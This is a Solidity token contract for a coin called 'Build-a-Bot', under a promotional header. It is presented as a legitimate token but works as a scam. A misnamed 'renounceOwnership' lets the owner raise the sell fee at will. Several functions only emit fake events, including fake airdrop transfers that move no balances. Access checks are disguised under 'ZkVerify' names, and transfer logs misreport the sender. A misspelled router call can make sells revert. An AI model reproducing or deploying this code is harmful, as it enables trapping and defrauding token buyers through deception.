/*
    oooooooooo.        .o.       oooooooooo.  
    `888'   `Y8b      .888.      `888'   `Y8b 
    888     888     .8"888.      888     888 
    888oooo888'    .8' `888.     888oooo888' 
    888    `88b   .88ooo8888.    888    `88b 
    888    .88P  .8'     `888.   888    .88P 
    o888bood8P'  o88o     o8888o o888bood8P'  

    Website: https://www.buildabotai.app/
    Twitter: https://twitter.com/buildabotai
    Telegram: https://t.me/Build_a_BOT_PORTAL
    Whitepaper: https://buildabot.gitbook.io

    Build-a-Bot represents a pivotal shift in online community interaction. This innovative platform 
    simplifies the creation of Telegram bots, incorporating powerful AI tools like ChatGPT and SDXL 
    without the need for coding skills. Aimed at community leaders, crypto enthusiasts, and those 
    passionate about online engagement, Build-a-Bot is your tool to create, engage, and transform 
    your online interactions.
*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BuildABot {

    string private _name = 'Build-a-Bot';
    string private _symbol = 'BAB';
    uint256 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private privateSaleWallet = 0xA690a26E3F968FeC5A602166B74eDC0366e511C5;
    address private teamWallet = 0x27C8204F0B63C809C44f64D711bDba7383fc61a8;
    address private treasury = 0x38a220846d8D4e747061a539c835ED6479205c0D;
    address private marketingWallet = 0x65C79D96bfADa194aF428C5079757527094C0b54; 
    address private stakingRewards = 0xA79013403B43663BcdF49a88ab02d3b35277FaA4;

    struct StoreData {
        address tokenMkt;
        uint256 buyFee;
        uint256 sellFee;
    }

    constructor() {
        uint256 _initBuyFee = 45;
        uint256 _initSellFee = 45;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 20) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[privateSaleWallet] = (totalSupply * 20) / 100;
        emit Transfer(address(0), privateSaleWallet, balanceOf[privateSaleWallet]);

        balanceOf[teamWallet] = (totalSupply * 10) / 100;
        emit Transfer(address(0), teamWallet, balanceOf[teamWallet]);

        balanceOf[treasury] = (totalSupply * 20) / 100;
        emit Transfer(address(0), treasury, balanceOf[treasury]);

        balanceOf[marketingWallet] = (totalSupply * 10) / 100;
        emit Transfer(address(0), marketingWallet, balanceOf[marketingWallet]);

        balanceOf[stakingRewards] = (totalSupply * 20) / 100;
        emit Transfer(address(0), stakingRewards, balanceOf[stakingRewards]);
    }

    event RevenueShare(uint256 _holder);
    event TotalTax(uint256 _buy, uint256 _sell);

    receive() external payable {}

    function renounceOwnership(uint256 x) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(0, x);
    }

    function setRevenueShare(uint256 _holder) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit RevenueShare(_holder);
    }

    function setTotalTax(uint256 _buy, uint256 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        emit TotalTax(_buy, _sell);
    }

    function distributionTokenForPresaleWallet(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function _upgradeStoreWithZkProof(uint256 _buy, uint256 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            swapping = false;
        }

        (uint256 _buyFee, uint256 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 1000;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}